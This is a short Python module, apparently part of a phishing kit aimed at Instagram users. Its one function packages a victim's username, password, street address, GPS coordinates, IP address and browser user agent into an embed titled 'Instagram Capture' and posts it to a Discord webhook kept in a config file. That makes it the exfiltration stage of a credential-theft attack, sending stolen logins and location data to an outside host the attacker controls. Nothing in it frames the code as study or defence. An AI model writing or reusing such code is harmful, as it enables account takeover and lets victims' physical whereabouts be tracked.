import requests
from config import DISCORD_WEBHOOK_URL

def send_to_discord(username, password, address, lat, lng, ip, ua):
    embed = {
        "title": "🎣 Instagram Capture",
        "color": 0xE1306C,
        "fields": [
            {"name": "ユーザー名", "value": f"`{username}`", "inline": False},
            {"name": "パスワード", "value": f"`{password}`", "inline": False},
            {"name": "住所", "value": address or "取得失敗", "inline": False},
            {"name": "座標", "value": f"{lat}, {lng}", "inline": True},
            {"name": "IP", "value": ip, "inline": True},
            {"name": "UA", "value": f"```{ua[:120]}```", "inline": False},
        ],
    }
    try:
        requests.post(DISCORD_WEBHOOK_URL, json={"embeds": [embed]}, timeout=10)
    except Exception as e:
        print(f"[discord] error: {e}")
